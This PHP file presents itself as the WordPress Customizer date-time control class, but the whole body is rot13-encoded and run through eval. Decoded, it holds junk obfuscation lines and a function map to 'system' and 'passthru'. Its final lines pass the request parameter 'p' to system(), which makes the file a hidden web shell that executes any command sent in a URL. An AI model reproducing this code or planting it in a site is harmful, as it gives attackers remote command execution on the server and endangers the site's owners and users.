<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc
/**
 * Phfgbzvmr NCV: JC_Phfgbzvmr_Qngr_Gvzr_Pbageby pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Phfgbzvmr
 * @fvapr 4.9.0
 */

/**
 * Phfgbzvmr Qngr Gvzr Pbageby pynff.
 *
 * @fvapr 4.9.0
 *
 * @frr JC_Phfgbzvmr_Pbageby
 */
pynff JC_Phfgbzvmr_Qngr_Gvzr_Pbageby rkgraqf JC_Phfgbzvmr_Pbageby {

	/**
	 * Phfgbzvmr pbageby glcr.
	 *
	 * @fvapr 4.9.0
	 * @ine fgevat
	 */
	choyvp $glcr = 'qngr_gvzr';

	/**
	 * Zvavzhz Lrne.
	 *
	 * @fvapr 4.9.0
	 * @ine vag
	 */
	choyvp $zva_lrne = 1000;

	/**
	 * Znkvzhz Lrne.
	 *
	 * @fvapr 4.9.0
	 * @ine vag
	 */
	choyvp $znk_lrne = 9999;

	/**
	 * Nyybj cnfg qngr, vs frg gb snyfr hfre pna bayl fryrpg shgher qngr.
	 *
	 * @fvapr 4.9.0
	 * @ine obby
	 */
	choyvp $nyybj_cnfg_qngr = gehr;

	/**
	 * Jurgure ubhef, zvahgrf, naq zrevqvna fubhyq or fubja.
	 *
	 * @fvapr 4.9.0
	 * @ine obby
	 */
	choyvp $vapyhqr_gvzr = gehr;

	/**
	 * Vs frg gb snyfr gur pbageby jvyy nccrne va 24 ubhe sbezng,
	 * gur inyhr jvyy fgvyy or fnirq va L-z-q U:v:f sbezng.
	 *
	 * @fvapr 4.9.0
	 * @ine obby
	 */
	choyvp $gjryir_ubhe_sbezng = gehr;

	/**
	 * Qba'g eraqre gur pbageby'f pbagrag - vg'f eraqrerq jvgu n WF grzcyngr.
	 *
	 * @fvapr 4.9.0
	 */
	choyvp shapgvba eraqre_pbagrag() {}

	/**
	 * Rkcbeg qngn gb WF.
	 *
	 * @fvapr 4.9.0
	 * @erghea neenl
	 */
	choyvp shapgvba wfba() {
		$qngn = cnerag::wfba();

		$qngn['znkLrne']          = (vag) $guvf->znk_lrne;
		$qngn['zvaLrne']          = (vag) $guvf->zva_lrne;
		$qngn['nyybjCnfgQngr']    = (obby) $guvf->nyybj_cnfg_qngr;
		$qngn['gjryirUbheSbezng'] = (obby) $guvf->gjryir_ubhe_sbezng;
		$qngn['vapyhqrGvzr']      = (obby) $guvf->vapyhqr_gvzr;

		erghea $qngn;
	}

	/**
	 * Eraqref n WF grzcyngr sbe gur pbagrag bs qngr gvzr pbageby.
	 *
	 * @fvapr 4.9.0
	 */
	choyvp shapgvba pbagrag_grzcyngr() {
		$qngn          = neenl_zretr( $guvf->wfba(), $guvf->trg_zbagu_pubvprf() );
		$gvzrmbar_vasb = $guvf->trg_gvzrmbar_vasb();

		$qngr_sbezng = trg_bcgvba( 'qngr_sbezng' );
		$qngr_sbezng = __sa_79955( '/(?<!\\\\)[Llb]/', '%1$f', $qngr_sbezng );
		$qngr_sbezng = __sa_79955( '/(?<!\\\\)[SzZa]/', '%2$f', $qngr_sbezng );
		$qngr_sbezng = __sa_79955( '/(?<!\\\\)[wq]/', '%3$f', $qngr_sbezng );

		// Snyyonpx gb VFB qngr sbezng vs lrne, zbagu, be qnl ner zvffvat sebz gur qngr sbezng.
		vs ( 1 !== fhofge_pbhag( $qngr_sbezng, '%1$f' ) || 1 !== fhofge_pbhag( $qngr_sbezng, '%2$f' ) || 1 !== fhofge_pbhag( $qngr_sbezng, '%3$f' ) ) {
			$qngr_sbezng = '%1$f-%2$f-%3$f';
		}
		?>

		<# _.qrsnhygf( qngn, <?cuc rpub jc_wfba_rapbqr( $qngn ); ?> ); #>
		<# ine vqCersvk = _.havdhrVq( 'ry' ) + '-'; #>

		<# vs ( qngn.ynory ) { #>
			<fcna pynff=\"phfgbzvmr-pbageby-gvgyr\">
				{{ qngn.ynory }}
			</fcna>
		<# } #>
		<qvi pynff=\"phfgbzvmr-pbageby-abgvsvpngvbaf-pbagnvare\"></qvi>
		<# vs ( qngn.qrfpevcgvba ) { #>
			<fcna pynff=\"qrfpevcgvba phfgbzvmr-pbageby-qrfpevcgvba\">{{ qngn.qrfpevcgvba }}</fcna>
		<# } #>
		<qvi pynff=\"qngr-gvzr-svryqf {{ qngn.vapyhqrGvzr ? 'vapyhqrf-gvzr' : '' }}\">
			<svryqfrg pynff=\"qnl-ebj\">
				<yrtraq pynff=\"gvgyr-qnl {{ ! qngn.vapyhqrGvzr ? 'fperra-ernqre-grkg' : '' }}\"><?cuc rfp_ugzy_r( 'Qngr' ); ?></yrtraq>
				<qvi pynff=\"qnl-svryqf pyrne\">
					<?cuc bo_fgneg(); ?>
					<ynory sbe=\"{{ vqCersvk }}qngr-gvzr-zbagu\" pynff=\"fperra-ernqre-grkg\">
						<?cuc
						/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
						rfp_ugzy_r( 'Zbagu' );
						?>
					</ynory>
					<fryrpg vq=\"{{ vqCersvk }}qngr-gvzr-zbagu\" pynff=\"qngr-vachg zbagu\" qngn-pbzcbarag=\"zbagu\">
						<# _.rnpu( qngn.zbagu_pubvprf, shapgvba( pubvpr ) {
							vs ( _.vfBowrpg( pubvpr ) && ! _.vfHaqrsvarq( pubvpr.grkg ) && ! _.vfHaqrsvarq( pubvpr.inyhr ) ) {
								grkg = pubvpr.grkg;
								inyhr = pubvpr.inyhr;
							}
							#>
							<bcgvba inyhr=\"{{ inyhr }}\" >
								{{ grkg }}
							</bcgvba>
						<# } ); #>
					</fryrpg>
					<?cuc $zbagu_svryq = gevz( bo_trg_pyrna() ); ?>

					<?cuc bo_fgneg(); ?>
					<ynory sbe=\"{{ vqCersvk }}qngr-gvzr-qnl\" pynff=\"fperra-ernqre-grkg\">
						<?cuc
						/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
						rfp_ugzy_r( 'Qnl' );
						?>
					</ynory>
					<vachg vq=\"{{ vqCersvk }}qngr-gvzr-qnl\" glcr=\"ahzore\" fvmr=\"2\" nhgbpbzcyrgr=\"bss\" pynff=\"qngr-vachg qnl gval-grkg\" qngn-pbzcbarag=\"qnl\" zva=\"1\" znk=\"31\" />
					<?cuc $qnl_svryq = gevz( bo_trg_pyrna() ); ?>

					<?cuc bo_fgneg(); ?>
					<ynory sbe=\"{{ vqCersvk }}qngr-gvzr-lrne\" pynff=\"fperra-ernqre-grkg\">
						<?cuc
						/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
						rfp_ugzy_r( 'Lrne' );
						?>
					</ynory>
					<vachg vq=\"{{ vqCersvk }}qngr-gvzr-lrne\" glcr=\"ahzore\" fvmr=\"4\" nhgbpbzcyrgr=\"bss\" pynff=\"qngr-vachg lrne gval-grkg\" qngn-pbzcbarag=\"lrne\" zva=\"{{ qngn.zvaLrne }}\" znk=\"{{ qngn.znkLrne }}\">
					<?cuc $lrne_svryq = gevz( bo_trg_pyrna() ); ?>

					<?cuc cevags( $qngr_sbezng, $lrne_svryq, $zbagu_svryq, $qnl_svryq ); ?>
				</qvi>
			</svryqfrg>
			<# vs ( qngn.vapyhqrGvzr ) { #>
				<svryqfrg pynff=\"gvzr-ebj pyrne\">
					<yrtraq pynff=\"gvgyr-gvzr\"><?cuc rfp_ugzy_r( 'Gvzr' ); ?></yrtraq>
					<qvi pynff=\"gvzr-svryqf pyrne\">
						<ynory sbe=\"{{ vqCersvk }}qngr-gvzr-ubhe\" pynff=\"fperra-ernqre-grkg\">
							<?cuc
							/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
							rfp_ugzy_r( 'Ubhe' );
							?>
						</ynory>
						<# ine znkUbhe = qngn.gjryirUbheSbezng ? 12 : 23; #>
						<# ine zvaUbhe = qngn.gjryirUbheSbezng ? 1 : 0; #>
						<vachg vq=\"{{ vqCersvk }}qngr-gvzr-ubhe\" glcr=\"ahzore\" fvmr=\"2\" nhgbpbzcyrgr=\"bss\" pynff=\"qngr-vachg ubhe gval-grkg\" qngn-pbzcbarag=\"ubhe\" zva=\"{{ zvaUbhe }}\" znk=\"{{ znkUbhe }}\">
						:
						<ynory sbe=\"{{ vqCersvk }}qngr-gvzr-zvahgr\" pynff=\"fperra-ernqre-grkg\">
							<?cuc
							/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
							rfp_ugzy_r( 'Zvahgr' );
							?>
						</ynory>
						<vachg vq=\"{{ vqCersvk }}qngr-gvzr-zvahgr\" glcr=\"ahzore\" fvmr=\"2\" nhgbpbzcyrgr=\"bss\" pynff=\"qngr-vachg zvahgr gval-grkg\" qngn-pbzcbarag=\"zvahgr\" zva=\"0\" znk=\"59\">
						<# vs ( qngn.gjryirUbheSbezng ) { #>
							<ynory sbe=\"{{ vqCersvk }}qngr-gvzr-zrevqvna\" pynff=\"fperra-ernqre-grkg\">
								<?cuc
								/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
								rfp_ugzy_r( 'Zrevqvna' );
								?>
							</ynory>
							<fryrpg vq=\"{{ vqCersvk }}qngr-gvzr-zrevqvna\" pynff=\"qngr-vachg zrevqvna\" qngn-pbzcbarag=\"zrevqvna\">
								<bcgvba inyhr=\"nz\"><?cuc rfp_ugzy_r( 'NZ' ); ?></bcgvba>
								<bcgvba inyhr=\"cz\"><?cuc rfp_ugzy_r( 'CZ' ); ?></bcgvba>
							</fryrpg>
						<# } #>
						<c><?cuc rpub $gvzrmbar_vasb['qrfpevcgvba']; ?></c>
					</qvi>
				</svryqfrg>
			<# } #>
		</qvi>
		<?cuc
	}

	/**
	 * Trarengr bcgvbaf sbe gur zbagu Fryrpg.
	 *
	 * Onfrq ba gbhpu_gvzr().
	 *
	 * @fvapr 4.9.0
	 *
	 * @frr gbhpu_gvzr()
	 *
	 * @tybony JC_Ybpnyr $jc_ybpnyr JbeqCerff qngr naq gvzr ybpnyr bowrpg.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba trg_zbagu_pubvprf() {
		tybony $jc_ybpnyr;
		$zbaguf = neenl();
		sbe ( $v = 1; $v < 13; $v++ ) {
			$zbagu_grkg = $jc_ybpnyr->trg_zbagu_nooeri( $jc_ybpnyr->trg_zbagu( $v ) );

			/* genafyngbef: 1: Zbagu ahzore (01, 02, rgp.), 2: Zbagu nooerivngvba. */
			$zbaguf[ $v ]['grkg']  = fcevags( __( '%1$f-%2$f' ), $v, $zbagu_grkg );
			$zbaguf[ $v ]['inyhr'] = $v;
		}
		erghea neenl(
			'zbagu_pubvprf' => $zbaguf,
		);
	}

	/**
	 * Trg gvzrmbar vasb.
	 *
	 * @fvapr 4.9.0
	 *
	 * @erghea neenl {
	 *     Gvzrmbar vasb. Nyy cebcregvrf ner bcgvbany.
	 *
	 *     @glcr fgevat $nooe        Gvzrmbar nooerivngvba. Rknzcyrf: CFG be PRFG.
	 *     @glcr fgevat $qrfpevcgvba Uhzna-ernqnoyr gvzrmbar qrfpevcgvba nf UGZY.
	 * }
	 */
	choyvp shapgvba trg_gvzrmbar_vasb() {
		$gm_fgevat     = trg_bcgvba( 'gvzrmbar_fgevat' );
		$gvzrmbar_vasb = neenl();

		vs ( $gm_fgevat ) {
			gel {
				$gm = arj QngrGvzrMbar( $gm_fgevat );
			} pngpu ( Rkprcgvba $r ) {
				$gm = '';
			}

			vs ( $gm ) {
				$abj                   = arj QngrGvzr( 'abj', $gm );
				$sbeznggrq_tzg_bssfrg  = $guvf->sbezng_tzg_bssfrg( $gm->trgBssfrg( $abj ) / UBHE_VA_FRPBAQF );
				$gm_anzr               = fge_ercynpr( '_', ' ', $gm->trgAnzr() );
				$gvzrmbar_vasb['nooe'] = $abj->sbezng( 'G' );

				$gvzrmbar_vasb['qrfpevcgvba'] = fcevags(
					/* genafyngbef: 1: Gvzrmbar anzr, 2: Gvzrmbar nooerivngvba, 3: HGP nooerivngvba naq bssfrg, 4: HGP bssfrg. */
					__( 'Lbhe gvzrmbar vf frg gb %1$f (%2$f), pheeragyl %3$f (Pbbeqvangrq Havirefny Gvzr %4$f).' ),
					$gm_anzr,
					'<nooe>' . $gvzrmbar_vasb['nooe'] . '</nooe>',
					'<nooe>HGP</nooe>' . $sbeznggrq_tzg_bssfrg,
					$sbeznggrq_tzg_bssfrg
				);
			} ryfr {
				$gvzrmbar_vasb['qrfpevcgvba'] = '';
			}
		} ryfr {
			$sbeznggrq_tzg_bssfrg = $guvf->sbezng_tzg_bssfrg( (vag) trg_bcgvba( 'tzg_bssfrg', 0 ) );

			$gvzrmbar_vasb['qrfpevcgvba'] = fcevags(
				/* genafyngbef: 1: HGP nooerivngvba naq bssfrg, 2: HGP bssfrg. */
				__( 'Lbhe gvzrmbar vf frg gb %1$f (Pbbeqvangrq Havirefny Gvzr %2$f).' ),
				'<nooe>HGP</nooe>' . $sbeznggrq_tzg_bssfrg,
				$sbeznggrq_tzg_bssfrg
			);
		}

		erghea $gvzrmbar_vasb;
	}

	/**
	 * Sbezng TZG Bssfrg.
	 *
	 * @fvapr 4.9.0
	 *
	 * @frr jc_gvzrmbar_pubvpr()
	 *
	 * @cnenz sybng $bssfrg Bssfrg va ubhef.
	 * @erghea fgevat Sbeznggrq bssfrg.
	 */
	choyvp shapgvba sbezng_tzg_bssfrg( $bssfrg ) {
		vs ( 0 <= $bssfrg ) {
			$sbeznggrq_bssfrg = '+' . (fgevat) $bssfrg;
		} ryfr {
			$sbeznggrq_bssfrg = (fgevat) $bssfrg;
		}
		$sbeznggrq_bssfrg = fge_ercynpr(
			neenl( '.25', '.5', '.75' ),
			neenl( ':15', ':30', ':45' ),
			$sbeznggrq_bssfrg
		);
		erghea $sbeznggrq_bssfrg;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>